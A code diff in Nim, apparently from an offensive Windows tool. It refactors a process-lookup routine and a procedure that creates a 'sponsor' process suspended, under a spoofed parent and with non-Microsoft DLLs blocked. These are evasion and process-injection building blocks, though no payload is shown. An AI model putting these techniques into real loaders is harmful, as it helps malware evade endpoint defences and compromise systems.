@@ -12,19 +12,15 @@ proc toString*(chars: openArray[WCHAR]): string =
 
 
 proc getPid*(pname: string): DWORD =
-    var 
-        entry: PROCESSENTRY32
-        hSnapshot: HANDLE
-
+    var entry: PROCESSENTRY32
+    var hSnapshot: HANDLE
     entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     defer: CloseHandle(hSnapshot)
-
     if Process32First(hSnapshot, addr entry):
         while Process32Next(hSnapshot, addr entry):
             if entry.szExeFile.toString == pname:
                 return entry.th32ProcessID
-
     return 0
 
 
@@ -61,7 +57,6 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
     var ts: SECURITY_ATTRIBUTES
     var policy: DWORD64
     var lpSize: SIZE_T
-    var res: WINBOOL
 
     # Block all non microsoft DLL's policy in new process
     policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
@@ -108,7 +103,8 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
             quit()
 
     # Create the suspended process
-    res = CreateProcess(
+    when not defined(release): echo "[*] Creating sponsor process suspended"
+    if CreateProcess(
         NULL,
         newWideCString(processCmd),
         ps,
@@ -119,7 +115,10 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
         NULL,
         addr si.StartupInfo,
         addr pi
-    )
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not create process"
+        quit()
+
 
     # Return updated process information
     return addr pi
